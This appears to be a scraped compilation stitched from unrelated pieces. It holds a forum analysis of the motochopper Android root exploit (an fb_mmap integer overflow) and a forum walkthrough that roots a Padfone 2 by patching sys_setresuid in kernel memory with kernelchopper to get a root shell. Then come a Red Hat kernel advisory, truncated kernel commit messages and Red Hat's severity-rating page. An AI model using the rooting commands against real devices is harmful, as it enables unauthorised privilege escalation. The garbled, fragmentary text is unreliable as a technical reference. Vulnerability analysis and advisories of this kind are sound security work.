  I ran the motochopper[1] "pwn" binary under an unprivileged shell on my CM10.1 Nexus 7 (Tegra chipset, codename "grouper"), and was surprised to find that it gained administrative privileges by changing all "shell"-owned (uid 2000) processes on the system to run as uid 0.

  It was somewhat worrying to see that an up-to-date ROM had an unpatched vulnerability, and I was concerned about whether rogue apps could leverage it. The CVE entry[2] was surprisingly vague, compounding my suspicions.

  Further investigation indicated that motochopper is running a series of syscalls from within a SIGTRAP handler to thwart tracing:

  Code:

  ```
  1662  [4019c940] sigaction(0x5, 0xbecfdcc8, 0xbecfdcc8) = 0
  1662  [4019ba5c] gettid()               = 0x67e
  1662  [4019d160] kill(0x67e, 0x5)       = 0
  1662  [4019d160] kill(0, 0x5)           = 0x5
  1662  [4019c940] sigaction(0, 0xbecfdcb0, 0xbecfdcb0) = 0x5
  1662  [4019ba5c] gettid()               = 0x67e
  1662  [4019d160] kill()                 = 0
  1662  [4019c940] sigaction(0x5, 0xbecfdcb0, 0xbecfdcb0) = 0
  1662  [4019ba5c] gettid()               = 0x67e
  1662  [4019d160] kill(0x67e, 0x5)       = 0
  1662  [4019d160] kill(0, 0x5)           = 0x5
  1662  [4019c940] sigaction(0, 0xbecfdcb0, 0xbecfdcb0) = 0x5
  1662  [4019ba5c] gettid()               = 0x67e
  1662  [4019d160] kill()                 = 0
  ```

  After disassembling the binary and patching it to invoke the syscalls directly, it looks like the problem involves the framebuffer driver. First, after opening a bunch of other (irrelevant, possibly decoy) devices, the exploit probes the real size of the framebuffer:

  Code:

  ```
  1728  open("/dev/graphics/fb0", O_RDWR) = 6
  ...
  1728  mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x400f2000
  1728  munmap(0x400f2000, 4096)          = 0
  1728  mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x40011000

  Clearly, a 2GB mapping on a 1GB device should not have succeeded; apparently this overlaps with kernel memory and the exploit is able to iterate through the task\_struct / creds to change the uid 2000 processes to uid 0:

  Code:

  ```
  1728  getuid()                          = 2000
  1728  getuid()                          = 2000
  1728  getuid()                          = 2000
  1728  getuid()                          = 2000
  1728  getuid()                          = 2000
  1728  getuid()                          = 2000
  1728  getuid()                          = 0
  1728  getuid32()                        = 0
  1728  write(1, "[+] Success!\n", 13)    = 13
  ```

  Checking the perms on /dev/graphics/fb0, it looks like most apps will not have access to this device (though the "graphics" group) and would not be able to directly use this exploit.

  Some unanswered questions:

  Does this exploit target the kernel's framebuffer infrastructure itself, or only specific drivers? I did not see any obvious fixes along the Linux 3.0 -stable branch, nor did I see any recent Asus kernel commits in the CM github repo.

  Why was the binary built with -fPIC and -O0? Is this a form of obfuscation?

  What is the significance of probing the framebuffer size? Is it meaningful that 9437184 = 0x900000, and the first mmap() length attempt was 2415919104 = 0x90000000?

  Edit:

  Some recent changes were made to fbmem.c:fb\_mmap() in mainline:

  <http://www.spinics.net/lists/stable/msg06210.html>

  <https://lkml.org/lkml/2013/4/23/623>

  There is no custom fb\_mmap() in Tegra's fb\_ops struct.

  Seeing the kernel maintainers madly rush to backport this innocuous-looking helper function to ancient releases like Linux 3.0, right around the same time motochopper was released (4/9), suggests that they might be trying to clean up a vulnerability in the framebuffer core.

  Edit #2:

  After staring at the code a little longer (and finally realizing that mmap2() takes a PAGE offset as its last argument, not a BYTE offset), here is what I see:

  Code:

  ```
  static int
  fb_mmap(struct file *file, struct vm_area_struct * vma)
  {
          struct fb_info *info = file_fb_info(file);
          struct fb_ops *fb;
          unsigned long off;
          unsigned long start;
          u32 len;

          if (!info)
                  return -ENODEV;
          if (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))
                  return -EINVAL;
          off = vma->vm_pgoff << PAGE_SHIFT;
          fb = info->fbops;
          if (!fb)
                  return -ENODEV;
          mutex_lock(&info->mm_lock);
          if (fb->fb_mmap) {
                  int res;
                  res = fb->fb_mmap(info, vma);
                  mutex_unlock(&info->mm_lock);
                  return res;
          }

          /* frame buffer memory */
          start = info->fix.smem_start;
          [color=red]len = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);[/color]
          if (off >= len) {
                  /* memory mapped io */
                  off -= len;
                  if (info->var.accel_flags) {
                          mutex_unlock(&info->mm_lock);
                          return -EINVAL;
                  }
                  start = info->fix.mmio_start;
                  len = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);
          }
          mutex_unlock(&info->mm_lock);
          start &= PAGE_MASK;
          [color=blue]if ((vma->vm_end - vma->vm_start + off) > len)
                  return -EINVAL;[/color]
          off += start;
          vma->vm_pgoff = off >> PAGE_SHIFT;
          /* This is an IO map - tell maydump to skip this VMA */
          vma->vm_flags |= VM_IO | VM_RESERVED;
          vma->vm_page_prot = vm_get_page_prot(vma->vm_flags);
          fb_pgprotect(file, vma, off);
          [color=green]if (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,
                               vma->vm_end - vma->vm_start, vma->vm_page_prot))[/color]
                  return -EAGAIN;
          return 0;
  }
  ```

  The initial mmap2/munmap sequence is trying to deduce the rounded smem\_len + (smem\_start partial page byte) value (len) by trying successively larger values until the check in blue returns -EINVAL. Result: 9437184 = 0x900000 (i.e. the framebuffer size is 9MB).

  fb\_mmap() is funny in that offsets 0 through (len-1) map the framebuffer, but offset (len) maps byte 0 of mmio\_start. Which looks to be uninitialized (zero) in the Tegra driver.

  The second sequence of mmap2() calls is trying to find the largest possible mapping. The kernel mmap2() syscall returns -ENOMEM if the mapping is too large for the virtual address space available to the process; fb\_mmap() is not even called if this happens. When fb\_mmap() is eventually called:

  Page offset = 0x82900

  Byte offset = off = 0x82900 << PAGE\_SHIFT = 0x8290\_0000

  len = 0x90\_0000 and "off" is much larger than len, so this hits the MMIO case. len is subtracted from off, leaving 0x8200\_0000. Since the offset is so large, the length check in blue overflows: the VMA size of 0x7e00\_0000 plus a len of 0x8200\_0000 comes out to exactly 0x1\_0000\_0000; truncated to 32 bits this is zero. This passes the sanity test, so the code in green happily creates a read-write mapping starting at physical address 0 (mmio\_start) and covering all of kernel memory.

  So basically motochopper is exploiting an unpublicized (but belatedly patched) kernel bug in fbmem.c.

  Hello to all, I just got root on padfone 2 without unlocking and without these prerequisites. I used adt-bundle-linux-x86-20130729, grep and a compiler (try terminal IDE, or use gentooandroid.sourceforge.net ; if you trust the binaries attached to this message you do not need any compiler), then kernelchopper, then applied manually the end of exynos-abuse.

  STEP 0: You may apply this on any Android system on your own risks. If your output of any instruction is not exactly as shown here, you should adapt following instructions accordingly (following color codes, and counting underlined words in hexadecimal notation), or better quit. **If you do not get exactly all the outputs I colored here in red, you should QUIT or change previous instructions.** If you have no internal microSD, I suggest to you to first chdir a directory of you computer which can host one file of size >4Gb (3898777809 bytes for my padfone 2, the day I bought it).

  STEP 1: finding s\_show->seq\_printf format string found at: 0x80c281c6.

  We first use adb to put all attached files (unzipped) in /data/data/com.spartacusrex.spartacuside/adb.

  Code:

  ```
  script backup_before_installing_su_to_disk
  adt-bundle-linux-x86-20130729/sdk/platform-tools/adb push /tmp/busybox /data/.tmp/grep

  c[COLOR="SandyBrown"]00856f0[/COLOR]  T sys_setresuid
  c00b7318  T sys_setresuid16
  ```

  Notice that /proc/kallsyms now gives offsets instead of 00000000.

  STEP 2: patching sys\_setresuid, applying manually exynos-abuse.c (found at 0x802856f0, which is 0x00856f0 plus 80208000). You should replace the underlined lone 8 by the number of bytes underlined, before the 00 00 50 e3 ...

  Code:

  ```
  ./kernelchopper d [COLOR="YellowGreen"]802856f0[/COLOR] 80 | ./grep '00 00 50 e3\|20 00 00 ea'
  [COLOR="Purple"]8028572[/COLOR]0: [U]04 72 93 e5 a7 da ff eb[/U] 00 00 50 e3 20 00 00 ea
  ./kernelchopper d [COLOR="Purple"]8028572[/COLOR][U]8[/U] 8

  ./kernelchopper m [COLOR="MediumTurquoise"]80285728[/COLOR]
  [COLOR="Red"]e3500000[/COLOR]
  ./kernelchopper m [COLOR="MediumTurquoise"]80285728[/COLOR] e3500001
  ```

  STEP 3: getting a root shell.

  Code:

  ```
  ./exynos-abuse-static
  2000@android:/data/.tmp # /system/bin/id
  uid=[COLOR="Red"]0[/COLOR](root) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)
  ```

  And you are root until end of connexion by adb. I strongly suggest to you to make the first true backup, to have a chance to restore phone to current state. With an internal microSD, you can type:

  Code:

  ```
  cp grep bzip2
  ./bzip2 -c < /dev/block/mmcblk0 > /Removable/Storage1/backup.bz2
  ```

  To exploit this file, you will need kpartx.

  If you have NO internal microSD, try a network drive; or if you can wait a full day (like me), you can do:

  Code:

  ```
  cp grep bzip2
  cp grep uuencode
  ./bzip2 -c < /dev/block/mmcblk0 | ./uuencode -
  ```

  The result will be shown on current window, so you have better hide it once it works. I had a performance of 400kb/s with hidden xterm.

  You will then be able to recover its content with

  Code:

  ```
  LANG= grep -aA99999999 '^begin 666 -' < backup_before_installing_su_to_diskreal | uudecode -o backup.bz2
  ```

  You may now install /system/xbin/su, eventually renamed to avoid exposing su to malware.

  Here is my firmware (see attached pic).

  Code:

  ```
  Android version: 4.1.1, 3.4.0-perf-g64..., M3.13.30-A68_101034 [Jan 22 2013]
  ```

  If you need help, please type up-arrow repeatedly, down-arrow repeatedly, then provide the file backup\_before\_installing\_su\_to\_diskreal.

## Synopsis

Important: kernel security and bug fix update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2015%3A0803)

## Topic

Updated kernel packages that fix multiple security issues and two bugs are
now available for Red Hat Enterprise Linux 6.4 Advanced Update Support.

Red Hat Product Security has rated this update as having Important security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

The kernel packages contain the Linux kernel, the core of any Linux
operating system.

* It was found that the Linux kernel's Infiniband subsystem did not

properly sanitize input parameters while registering memory regions from
user space via the (u)verbs API. A local user with access to a
/dev/infiniband/uverbsX device could use this flaw to crash the system or,
potentially, escalate their privileges on the system. (CVE-2014-8159,
Important)

* An integer overflow flaw was found in the way the Linux kernel's Frame

Buffer device implementation mapped kernel memory to user space via the
mmap syscall. A local user able to access a frame buffer device file
(/dev/fb\*) could possibly use this flaw to escalate their privileges on the
system. (CVE-2013-2596, Important)

* It was found that the parse\_rock\_ridge\_inode\_internal() function of the

Linux kernel's ISOFS implementation did not correctly check relocated
directories when processing Rock Ridge child link (CL) tags. An attacker
with physical access to the system could use a specially crafted ISO image
to crash the system or, potentially, escalate their privileges on the
system. (CVE-2014-5471, CVE-2014-5472, Low)

Red Hat would like to thank Mellanox for reporting the CVE-2014-8159 issue.

This update also fixes the following bugs:

* The kernel could sometimes panic due to a possible division by zero in

the kernel scheduler. This bug has been fixed by defining a new div64\_ul()
division function and correcting the affected calculation in the
proc\_sched\_show\_task() function. (BZ#1199898)

* When repeating a Coordinated Universal Time (UTC) value during a leap

second (when the UTC time should be 23:59:60), the International Atomic
Time (TAI) timescale previously stopped as the kernel NTP code incremented
the TAI offset one second too late. A patch has been provided, which fixes
the bug by incrementing the offset during the leap second itself. Now, the
correct TAI is set during the leap second. (BZ#1201672)

All kernel users are advised to upgrade to these updated packages, which
contain backported patches to correct these issues. The system must be
rebooted for this update to take effect.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

Revert "MIPS: page.h: Provide more readable definition for PAGE\_MASK."
commit 3b5e50edaf500f392f4a372296afc0b99ffa7e70 upstream.
This reverts commit c17a6554782ad531f4713b33fd6339ba67ef6391.
Manuel Lauss writes:
lmo commit c17a6554 (MIPS: page.h: Provide more readable definition for
PAGE\_MASK) apparently breaks ioremap of 36-bit addresses on my Alchemy
systems (PCI and PCMCIA) The reason is that in arch/mips/mm/ioremap.c
line 157 (phys\_addr &= PAGE\_MASK) bits 32-35 are cut off. Seems the
new PAGE\_MASK is explicitly 32bit, or one could make it signed instead
of unsigned long.

s390: move dummy io\_remap\_pfn\_range() to asm/pgtable.h
commit 4f2e29031e6c67802e7370292dd050fd62f337ee upstream.
Commit b4cbb197c7e7 ("vm: add vm\_iomap\_memory() helper function") added
a helper function wrapper around io\_remap\_pfn\_range(), and every other
architecture defined it in .
The s390 choice of  may make sense, but is not very convenient
for this case, and gratuitous differences like that cause unexpected errors like this:
mm/memory.c: In function 'vm\_iomap\_memory':
mm/memory.c:2439:2: error: implicit declaration of function 'io\_remap\_pfn\_range' [-Werror=implicit-function-declaration]
Glory be the kbuild test robot who noticed this, bisected it, and
reported it to the guilty parties (ie me).

commit c5627099f70b1187b84fa711f6b5daf32f16b10e

Btrfs: make sure nbytes are right after log replay
commit 4bc4bee4595662d8bff92180d5c32e3313a704b0 upstream.
While trying to track down a tree log replay bug I noticed that fsck was always
complaining about nbytes not being right for our fsynced file. That is because
the new fsync stuff doesn't wait for ordered extents to complete, so the inodes
nbytes are not necessarily updated properly when we log it. So to fix this we
need to set nbytes to whatever it is on the inode that is on disk, so when we
replay the extents we can just add the bytes that are being added as we replay
the extent. This makes it work for the case that we have the wrong nbytes or

vm: convert mtdchar mmap to vm\_iomap\_memory() helper

This is my example conversion of a few existing mmap users. The mtdchar
case is actually disabled right now (and stays disabled), but I did it
because it showed up on my "git grep", and I was familiar with the code
due to fixing an overflow problem in the code in commit 9c603e53d380

vm: add vm\_iomap\_memory() helper function
commit b4cbb197c7e7a68dbad0d491242e3ca67420c13e upstream.
Various drivers end up replicating the code to mmap() their memory
buffers into user space, and our core memory remapping function may be
very flexible but it is unnecessarily complicated for the common cases
to use.
Our internal VM uses pfn's ("page frame numbers") which simplifies
things for the VM, and allows us to pass physical addresses around in a
denser and more efficient format than passing a "phys\_addr\_t" around,
and having to shift it up and down by the page size. But it just means
that drivers end up doing that shifting instead at the interface level.
It also means that drivers end up mucking around with internal VM things
like the vma details (vm\_pgoff, vm\_start/end) way more than they really
need to.
So this just exports a function to map a certain physical memory range
into user space (using a phys\_addr\_t based interface that is much more
natural for a driver) and hides all the complexity from the driver.
Some drivers will still end up tweaking the vm\_page\_prot details for
things like prefetching or cacheability etc, but that's actually
relevant to the driver, rather than caring about what the page offset of
the mapping is into the particular IO memory region.

commit 6708075f104c3c9b04b23336bb0366ca30c3931b upstream.
When we require privilege for setting /proc//uid\_map or
/proc//gid\_map no longer allow an unprivileged user to
open the file and pass it to a privileged program to write
to the file.
Instead when privilege is required require both the opener and the
writer to have the necessary capabilities.
I have tested this code and verified that setting /proc//uid\_map
fails when an unprivileged user opens the file and a privielged user
attempts to set the mapping, that unprivileged users can still map
their own id, and that a privileged users can still setup an arbitrary
mapping.

perf/x86: Fix offcore\_rsp valid mask for SNB/IVB
commit f1923820c447e986a9da0fc6bf60c1dccdf0408e upstream.
The valid mask for both offcore\_response\_0 and
offcore\_response\_1 was wrong for SNB/SNB-EP,
IVB/IVB-EP. It was possible to write to
reserved bit and cause a GP fault crashing
the kernel.
This patch fixes the problem by correctly marking the
reserved bits in the valid mask for all the processors
mentioned above.
A distinction between desktop and server parts is introduced
because bits 24-30 are only available on the server parts.
This version of the patch is just a rebase to perf/urgent tree
and should apply to older kernels as well.

mac80211: fix cfg80211 interaction on auth/assoc request
commit 7b119dc06d871405fc7c3e9a73a6c987409ba639 upstream.
If authentication (or association with FT) is requested by
userspace, mac80211 currently doesn't tell cfg80211 that it
disconnected from the AP. That leaves inconsistent state:
cfg80211 thinks it's connected while mac80211 thinks it's
not. Typically this won't last long, as soon as mac80211
reports the new association to cfg80211 the old one goes
away. If, however, the new authentication or association
doesn't succeed, then cfg80211 will forever think the old
one still exists and will refuse attempts to authenticate
or associate with the AP it thinks it's connected to.
Anders reported that this leads to it taking a very long
time to reconnect to a network, or never even succeeding.
I tested this with an AP hacked to never respond to auth
frames, and one that works, and with just those two the
system never recovers because one won't work and cfg80211
thinks it's connected to the other so refuses connections
to it.
To fix this, simply make mac80211 tell cfg80211 when it is
no longer connected to the old AP, while authenticating or
associating to a new one.

commit cd272d1ea71583170e95dde02c76166c7f9017e6 upstream.
On Feroceon the L2 cache becomes non-coherent with the CPU
when the L1 caches are disabled. Thus the L2 needs to be invalidated
after both L1 caches are disabled.
On kexec before the starting the code for relocation the kernel,
the L1 caches are disabled in cpu\_froc\_fin (cpu\_v7\_proc\_fin for Feroceon),
but after L2 cache is never invalidated, because inv\_all is not set
in cache-feroceon-l2.c.
So kernel relocation and decompression may has (and usually has) errors.
Setting the function enables L2 invalidation and fixes the issue.

Unfortunately, it does not have enough room in the selfboot case (i.e.
devices with no NVRAM). The driver needs to implement this.
- For performance reasons, the 2k DMA engine mode on the 57766 should
be enabled and dma size limited to 2k for standard sized packets.

This patch enables iomuxc\_gate clock. It is necessary to be able to

clk\_disable\_unused function will disable this clock and the iomux pads

(watchdog system reset) the clock is not enabled again, so all iomux pad
reconfigurations in boot code are without effect.

ARM: i.MX35: enable MAX clock
commit 5dc2eb7da1e387e31ce54f54af580c6a6f512ca6 upstream.
The i.MX35 has two bits per clock gate which are decoded as follows:
0b00 -> clock off
0b01 -> clock is on in run mode, off in wait/doze
0b10 -> clock is on in run/wait mode, off in doze
0b11 -> clock is always on
The reset value for the MAX clock is 0b10.
The MAX clock is needed by the SoC, yet unused in the Kernel, so the
common clock framework will disable it during late init time. It will
only disable clocks though which it detects as being turned on. This
detection is made depending on the lower bit of the gate. If the reset
value has been altered by the bootloader to 0b11 the clock framework
will detect the clock as turned on, yet unused, hence it will turn it
off and the system locks up.
This patch turns the MAX clock on unconditionally making the Kernel
independent of the bootloader.

that request. ioapic\_read\_indirect contains an
ASSERT(redir\_index < IOAPIC\_NUM\_PINS), but the ASSERT has no effect in
non-debug builds. In recent kernels this allows a guest to cause a kernel

address even after it's removed via KVM\_SET\_USER\_MEMORY\_REGION. KVM pins
the page in memory so it's unlikely to cause an issue, but if the user

If the guest sets the GPA of the time\_page so that the request to update the

write is done byusing kmap atomic to get a pointer to the page for the time
structure and then performing a memcpy to that page starting at an offset
that the guest controls. Well behaved guests always provide a 32-byte aligned

kernel/signal.c: stop info leak via the tkill and the tgkill syscalls
commit b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f upstream.
This fixes a kernel memory contents leak via the tkill and tgkill syscalls
for compat processes.
This is visible in the siginfo\_t->\_sifields.\_rt.si\_sigval.sival\_ptr field
when handling signals delivered from tkill.
The place of the infoleak:
int copy\_siginfo\_to\_user32(compat\_siginfo\_t \_\_user \*to, siginfo\_t \*from)
{
...
put\_user\_ex(ptr\_to\_compat(from->si\_ptr), &to->si\_ptr);

fs/binfmt\_elf.c: fix hugetlb memory check in vma\_dump\_size()
commit 23d9e482136e31c9d287633a6e473daa172767c4 upstream.
Documentation/filesystems/proc.txt says about coredump\_filter bitmask,
Note bit 0-4 doesn't effect any hugetlb memory. hugetlb memory are only
effected by bit 5-6.
However current code can go into the subsequent flag checks of bit 0-4
for vma(VM\_HUGETLB). So this patch inserts 'return' and makes it work
as written in the document.

hugetlbfs: add swap entry check in follow\_hugetlb\_page()
commit 9cc3a5bd40067b9a0fbd49199d0780463fc2140f upstream.
With applying the previous patch "hugetlbfs: stop setting VM\_DONTDUMP in
initializing vma(VM\_HUGETLB)" to reenable hugepage coredump, if a memory
error happens on a hugepage and the affected processes try to access the
error hugepage, we hit VM\_BUG\_ON(atomic\_read(&page->\_count) <= 0) in
get\_page().
The reason for this bug is that coredump-related code doesn't recognise
"hugepage hwpoison entry" with which a pmd entry is replaced when a memory
error occurs on a hugepage.
In other words, physical address information is stored in different bit
layout between hugepage hwpoison entry and pmd entry, so
follow\_hugetlb\_page() which is called in get\_dump\_page() returns a wrong
page from a given address.
The expected behavior is like this:
absent is\_swap\_pte FOLL\_DUMP Expected behavior
-------------------------------------------------------------------
true false false hugetlb\_fault
false true false hugetlb\_fault
false false false return page
true false true skip page (to avoid allocation)
false true true hugetlb\_fault
false false true return page
With this patch, we can call hugetlb\_fault() and take proper actions (we
wait for migration entries, fail with VM\_FAULT\_HWPOISON\_LARGE for
hwpoisoned entries,) and as the result we can dump all hugepages except
for hwpoisoned ones.

hugetlbfs: stop setting VM\_DONTDUMP in initializing vma(VM\_HUGETLB)
commit a2fce9143057f4eb7675a21cca1b6beabe585c8b upstream.
Currently we fail to include any data on hugepages into coredump,
because VM\_DONTDUMP is set on hugetlbfs's vma. This behavior was
recently introduced by commit 314e51b9851b ("mm: kill vma flag
VM\_RESERVED and mm->reserved\_vm counter").
This looks to me a serious regression, so let's fix it.

hrtimer: Don't reinitialize a cpu\_base lock on CPU\_UP
commit 84cc8fd2fe65866e49d70b38b3fdf7219dd92fe0 upstream.
The current code makes the assumption that a cpu\_base lock won't be
held if the CPU corresponding to that cpu\_base is offline, which isn't
always true.
If a hrtimer is not queued, then it will not be migrated by
migrate\_hrtimers() when a CPU is offlined. Therefore, the hrtimer's
cpu\_base may still point to a CPU which has subsequently gone offline
if the timer wasn't enqueued at the time the CPU went down.
Normally this wouldn't be a problem, but a cpu\_base's lock is blindly
reinitialized each time a CPU is brought up. If a CPU is brought
online during the period that another thread is performing a hrtimer
operation on a stale hrtimer, then the lock will be reinitialized
under its feet, and a SPIN\_BUG() like the following will be observed:
<0>[ 28.082085] BUG: spinlock already unlocked on CPU#0, swapper/0/0
<0>[ 28.087078] lock: 0xc4780b40, value 0x0 .magic: dead4ead, .owner: /-1, .owner\_cpu: -1

<4>[ 42.524319] [] (rest\_init+0x88/0xa0) from [] (start\_kernel+0x3d0/0x434)
As an example, this particular crash occurred when hrtimer\_start() was
executed on CPU #0. The code locked the hrtimer's current cpu\_base
corresponding to CPU #1. CPU #0 then tried to switch the hrtimer's
cpu\_base to an optimal CPU which was online. In this case, it selected
the cpu\_base corresponding to CPU #3.
Before it could proceed, CPU #1 came online and reinitialized the
spinlock corresponding to its cpu\_base. Thus now CPU #0 held a lock
which was reinitialized. When CPU #0 finally ended up unlocking the
old cpu\_base corresponding to CPU #1 so that it could switch to CPU
#3, we hit this SPIN\_BUG() above while in switch\_hrtimer\_base().
CPU #0 CPU #1
---- ----
...
hrtimer\_start()
lock\_hrtimer\_base(base #1)
... init\_hrtimers\_cpu()
switch\_hrtimer\_base() ...
... raw\_spin\_lock\_init(&cpu\_base->lock)
raw\_spin\_unlock(&cpu\_base->lock) ...
Solve this by statically initializing the lock.

kthread: Prevent unpark race which puts threads on the wrong cpu
commit f2530dc71cf0822f90bb63ea4600caaef33a66bb upstream.
The smpboot threads rely on the park/unpark mechanism which binds per
cpu threads on a particular core. Though the functionality is racy:
CPU0 CPU1 CPU2
unpark(T) wake\_up\_process(T)
clear(SHOULD\_PARK) T runs
leave parkme() due to !SHOULD\_PARK
bind\_to(CPU2) BUG\_ON(wrong CPU)
We cannot let the tasks move themself to the target CPU as one of
those tasks is actually the migration thread itself, which requires
that it starts running on the target cpu right away.
The solution to this problem is to prevent wakeups in park mode which
are not from unpark(). That way we can guarantee that the association
of the task to the target cpu is working correctly.
Add a new task state (TASK\_PARKED) which prevents other wakeups and
use this state explicitly for the unpark wakeup.
Peter noticed: Also, since the task state is visible to userspace and
all the parked tasks are still in the PID space, its a good hint in ps
and friends that these tasks aren't really there for the moment.
The migration thread has another related issue.
CPU0 CPU1
Bring up CPU2
create\_thread(T)
park(T)
wait\_for\_completion()
parkme()
complete()
sched\_set\_stop\_task()
schedule(TASK\_PARKED)
The sched\_set\_stop\_task() call is issued while the task is on the
runqueue of CPU1 and that confuses the hell out of the stop\_task class
on that cpu. So we need the same synchronizaion before
sched\_set\_stop\_task().

kvm/powerpc/e500mc: fix tlb invalidation on cpu migration
commit c5e6cb051c5f7d56f05bd6a4af22cb300a4ced79 upstream.
The existing check handles the case where we've migrated to a different
core than we last ran on, but it doesn't handle the case where we're
still on the same cpu we last ran on, but some other vcpu has run on
this cpu in the meantime.
Without this, guest segfaults (and other misbehavior) have been seen in
smp guests.

```
This is my example conversion of a few existing mmap users.  The
fb_mmap() case is a good example because it is a bit more complicated
than some: fb_mmap() mmaps one of two different memory areas depending
on the page offset of the mmap (but happily there is never any mixing of
the two, so the helper function still works).

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
